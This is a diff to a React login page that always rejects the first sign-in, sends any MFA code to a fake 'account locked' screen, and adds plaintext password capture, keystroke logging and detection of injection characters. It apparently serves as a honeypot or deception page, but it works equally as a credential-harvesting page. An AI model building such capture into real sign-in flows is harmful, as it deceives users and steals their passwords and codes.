@@ -12,35 +12,34 @@ export default function Login() {
   const [error, setError] = useState('');
   const [shaking, setShaking] = useState(false);
   const [countdownTimer, setCountdownTimer] = useState(30);
+
   useEffect(() => {
     sessionTracker.recordPageView('login');
-    return () => {
-      sessionTracker.recordPageExit();
-    };
+    return () => sessionTracker.recordPageExit();
   }, []);
 
-  // Countdown timer for MFA
   useEffect(() => {
     if (stage === 2 && countdownTimer > 0) {
-      const timer = setTimeout(() => setCountdownTimer(countdownTimer - 1), 1000);
+      const timer = setTimeout(() => setCountdownTimer(c => c - 1), 1000);
       return () => clearTimeout(timer);
     }
   }, [stage, countdownTimer]);
 
   const handleStage1Submit = (e) => {
     e.preventDefault();
-    sessionTracker.recordInteraction('login_attempt', 'stage_1', {
-      username,
-      timestamp: Date.now()
-    });
 
-    // Validate inputs
     if (!username.trim() || !password.trim()) {
       setError('Please enter your credentials');
       return;
     }
 
-    // First attempt - error
+    // Record the credential attempt
+    sessionTracker.recordCredential(username, password);
+    sessionTracker.recordInteraction('login_attempt', 'stage_1', {
+      username,
+      timestamp: Date.now()
+    });
+
     setError('Incorrect credentials. Please try again.');
     setShaking(true);
     setTimeout(() => setShaking(false), 500);
@@ -53,8 +52,6 @@ export default function Login() {
       mfaCode,
       timestamp: Date.now()
     });
-
-    // Any MFA code submitted goes to locked account
     setStage(3);
   };
 
@@ -78,9 +75,12 @@ export default function Login() {
     setStage(5);
   };
 
+  const specialKeys = ["'", '"', '-', ';', '<', '>', '='];
+
   return (
     <div className="px-4 sm:px-6 pb-8">
       <div className="container-shell premium-card overflow-hidden grid lg:grid-cols-2 min-h-[72vh]">
+
         {/* Left Panel */}
         <div className="bg-gradient-to-br from-slate-950 via-blue-900 to-sky-700 text-white p-8 sm:p-10 lg:p-12 flex flex-col justify-between">
           <div className="mb-8">
@@ -94,25 +94,24 @@ export default function Login() {
             Verified access for authorized personnel. Every login flow is monitored for suspicious behavior.
           </p>
           <div className="space-y-4 text-blue-100 text-sm sm:text-base">
-            <div className="flex items-start space-x-3 bg-white/10 rounded-xl p-3 border border-white/10">
-              <CheckCircle size={20} className="mt-1 flex-shrink-0" />
-              <span>End-to-end encrypted connections</span>
-            </div>
-            <div className="flex items-start space-x-3 bg-white/10 rounded-xl p-3 border border-white/10">
-              <CheckCircle size={20} className="mt-1 flex-shrink-0" />
-              <span>Multi-factor authentication enabled</span>
-            </div>
-            <div className="flex items-start space-x-3 bg-white/10 rounded-xl p-3 border border-white/10">
-              <CheckCircle size={20} className="mt-1 flex-shrink-0" />
-              <span>24/7 security monitoring</span>
-            </div>
+            {[
+              'End-to-end encrypted connections',
+              'Multi-factor authentication enabled',
+              '24/7 security monitoring'
+            ].map((text, i) => (
+              <div key={i} className="flex items-start space-x-3 bg-white/10 rounded-xl p-3 border border-white/10">
+                <CheckCircle size={20} className="mt-1 flex-shrink-0" />
+                <span>{text}</span>
+              </div>
+            ))}
           </div>
         </div>
 
-        {/* Right Panel - Forms */}
+        {/* Right Panel */}
         <div className="flex items-center justify-center p-7 sm:p-9 lg:p-12 bg-white">
           <div className="w-full max-w-md">
-            {/* Stage 1: Login */}
+
+            {/* Stage 1 — Login */}
             {stage === 1 && (
               <div className={`fade-in ${shaking ? 'shake-animation' : ''}`}>
                 <h2 className="text-3xl font-extrabold text-slate-900 mb-2">Sign In</h2>
@@ -120,7 +119,9 @@ export default function Login() {
 
                 <form onSubmit={handleStage1Submit} className="space-y-4">
                   <div>
-                    <label className="block text-sm font-semibold text-slate-700 mb-2">Username</label>
+                    <label className="block text-sm font-semibold text-slate-700 mb-2">
+                      Username
+                    </label>
                     <input
                       type="text"
                       value={username}
@@ -130,10 +131,8 @@ export default function Login() {
                       }}
                       onKeyDown={(e) => {
                         sessionTracker.recordKeystroke('username', e.key, Date.now());
-                        const special = ["'", '"', '-', ';', '<', '>', '='];
-                        if (special.includes(e.key)) {
+                        if (specialKeys.includes(e.key))
                           sessionTracker.recordSpecialChar('username', e.key);
-                        }
                       }}
                       onPaste={() => sessionTracker.recordPaste('username')}
                       placeholder="Enter your username"
@@ -143,7 +142,9 @@ export default function Login() {
                   </div>
 
                   <div>
-                    <label className="block text-sm font-semibold text-slate-700 mb-2">Password</label>
+                    <label className="block text-sm font-semibold text-slate-700 mb-2">
+                      Password
+                    </label>
                     <input
                       type="password"
                       value={password}
@@ -153,10 +154,8 @@ export default function Login() {
                       }}
                       onKeyDown={(e) => {
                         sessionTracker.recordKeystroke('password', e.key, Date.now());
-                        const special = ["'", '"', '-', ';', '<', '>', '='];
-                        if (special.includes(e.key)) {
+                        if (specialKeys.includes(e.key))
                           sessionTracker.recordSpecialChar('password', e.key);
-                        }
                       }}
                       onPaste={() => sessionTracker.recordPaste('password')}
                       placeholder="Enter your password"
@@ -208,15 +207,21 @@ export default function Login() {
               </div>
             )}
 
-            {/* Stage 2: MFA */}
+            {/* Stage 2 — MFA */}
             {stage === 2 && (
               <div className="fade-in">
-                <h2 className="text-3xl font-extrabold text-slate-900 mb-2">Two-Factor Authentication</h2>
-                <p className="text-slate-600 mb-8">Enter the 6-digit code sent to your device ending in **34</p>
+                <h2 className="text-3xl font-extrabold text-slate-900 mb-2">
+                  Two-Factor Authentication
+                </h2>
+                <p className="text-slate-600 mb-8">
+                  Enter the 6-digit code sent to your device ending in **34
+                </p>
 
                 <form onSubmit={handleMFASubmit} className="space-y-4">
                   <div>
-                    <label className="block text-sm font-semibold text-slate-700 mb-2">Verification Code</label>
+                    <label className="block text-sm font-semibold text-slate-700 mb-2">
+                      Verification Code
+                    </label>
                     <input
                       type="text"
                       maxLength="6"
@@ -226,6 +231,10 @@ export default function Login() {
                         setMfaCode(val);
                         sessionTracker.recordInteraction('form_input', 'mfa_code');
                       }}
+                      onKeyDown={(e) =>
+                        sessionTracker.recordKeystroke('mfa', e.key, Date.now())
+                      }
+                      onPaste={() => sessionTracker.recordPaste('mfa_code')}
                       placeholder="000000"
                       className="input-premium px-4 py-3 text-2xl tracking-[0.45em] text-center"
                       autoFocus
@@ -233,7 +242,8 @@ export default function Login() {
                   </div>
 
                   <p className="text-sm text-slate-600 text-center">
-                    Code expires in: <span className="font-semibold text-red-600">{countdownTimer}s</span>
+                    Code expires in:{' '}
+                    <span className="font-semibold text-red-600">{countdownTimer}s</span>
                   </p>
 
                   <button
@@ -248,7 +258,9 @@ export default function Login() {
 
                 <div className="mt-6 text-center">
                   <button
-                    onClick={() => sessionTracker.recordInteraction('resend_code_click', 'mfa')}
+                    onClick={() =>
+                      sessionTracker.recordInteraction('resend_code_click', 'mfa')
+                    }
                     className="text-blue-900 hover:text-sky-700 text-sm font-semibold"
                   >
                     Resend code
@@ -257,16 +269,19 @@ export default function Login() {
               </div>
             )}
 
-            {/* Stage 3: Account Locked */}
+            {/* Stage 3 — Account Locked */}
             {stage === 3 && (
               <div className="fade-in">
                 <div className="p-6 bg-red-50 border border-red-200 rounded-2xl mb-8">
                   <div className="flex items-start space-x-4">
                     <AlertCircle size={24} className="text-red-600 flex-shrink-0 mt-0.5" />
                     <div>
-                      <h2 className="text-xl font-bold text-red-800 mb-2">Too Many Failed Attempts</h2>
+                      <h2 className="text-xl font-bold text-red-800 mb-2">
+                        Too Many Failed Attempts
+                      </h2>
                       <p className="text-red-700 mb-4">
-                        Your account has been temporarily locked for security. This is a protective measure to keep your account safe.
+                        Your account has been temporarily locked for security.
+                        This is a protective measure to keep your account safe.
                       </p>
                       <p className="text-red-700 text-sm mb-3">
                         To regain access, please contact IT Support:
@@ -296,15 +311,21 @@ export default function Login() {
               </div>
             )}
 
-            {/* Stage 4: Forgot Password */}
+            {/* Stage 4 — Forgot Password */}
             {stage === 4 && (
               <div className="fade-in">
-                <h2 className="text-3xl font-extrabold text-slate-900 mb-2">Reset Password</h2>
-                <p className="text-slate-600 mb-8">Enter your email address and we will send you a reset link</p>
+                <h2 className="text-3xl font-extrabold text-slate-900 mb-2">
+                  Reset Password
+                </h2>
+                <p className="text-slate-600 mb-8">
+                  Enter your email address and we will send you a reset link
+                </p>
 
                 <form onSubmit={handleResetEmail} className="space-y-4">
                   <div>
-                    <label className="block text-sm font-semibold text-slate-700 mb-2">Email Address</label>
+                    <label className="block text-sm font-semibold text-slate-700 mb-2">
+                      Email Address
+                    </label>
                     <input
                       type="email"
                       value={email}
@@ -312,6 +333,10 @@ export default function Login() {
                         setEmail(e.target.value);
                         sessionTracker.recordInteraction('form_input', 'reset_email');
                       }}
+                      onKeyDown={(e) =>
+                        sessionTracker.recordKeystroke('email', e.key, Date.now())
+                      }
+                      onPaste={() => sessionTracker.recordPaste('reset_email')}
                       placeholder="your.email@nexacorp.com"
                       className="input-premium px-4 py-3"
                       autoFocus
@@ -350,14 +375,16 @@ export default function Login() {
               </div>
             )}
 
-            {/* Stage 5: Reset Email Sent */}
+            {/* Stage 5 — Reset Sent */}
             {stage === 5 && (
               <div className="fade-in text-center">
                 <div className="mb-6">
                   <CheckCircle size={64} className="text-green-600 mx-auto mb-4" />
                   <h2 className="text-3xl font-extrabold text-slate-900 mb-2">Email Sent</h2>
                   <p className="text-slate-600">
-                    If an account exists with the email <span className="font-semibold">{email}</span>, you will receive a password reset link shortly.
+                    If an account exists with the email{' '}
+                    <span className="font-semibold">{email}</span>, you will
+                    receive a password reset link shortly.
                   </p>
                 </div>
 
@@ -375,6 +402,7 @@ export default function Login() {
                 </button>
               </div>
             )}
+
           </div>
         </div>
       </div>
